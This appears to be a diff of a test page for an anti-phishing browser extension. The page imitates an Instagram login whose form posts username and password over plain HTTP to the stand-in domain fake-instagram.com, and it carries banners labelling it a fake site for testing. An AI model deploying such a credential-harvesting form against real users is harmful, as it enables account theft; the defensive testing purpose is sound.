@@ -4,14 +4,106 @@
 <head>
     <meta charset="UTF-8">
     <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #856404;
+        }
+        .warning strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #5568d3;
+        }
+        .instructions {
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Instagram</h1>
-    <form action="http://fake-instagram.com/login" method="POST">
-        <input type="text" name="username" placeholder="Username"><br>
-        <input type="password" name="password" placeholder="Password"><br>
-        <input type="hidden" name="token" value="abc123">
-        <button type="submit">Log In</button>
-    </form>
+    <div class="container">
+        <h1>📸 Instagram</h1>
+        
+        <div class="warning">
+            <strong>⚠️ TEST PAGE - This is a fake phishing site for testing!</strong>
+            <br>If you see a red warning banner at the top, the extension is working! ✅
+            <br>When you try to submit, the form should be blocked and show a warning modal.
+        </div>
+
+        <div class="instructions">
+            <strong>What to test:</strong>
+            <ul style="margin: 5px 0; padding-left: 20px;">
+                <li>Red warning banner should appear at top of page</li>
+                <li>Open console (F12) to see debug logs</li>
+                <li>Try submitting the form - it should be blocked</li>
+            </ul>
+        </div>
+
+        <form action="http://fake-instagram.com/login" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="token" value="abc123">
+            <button type="submit">Log In</button>
+        </form>
+
+        <div style="margin-top: 20px; font-size: 12px; color: #666; text-align: center;">
+            This form has suspicious characteristics:
+            <br>• Posts to different domain (fake-instagram.com)
+            <br>• Not using HTTPS
+            <br>• Brand impersonation (Instagram)
+            <br>• Hidden input field
+        </div>
+    </div>
 </body>
 </html>
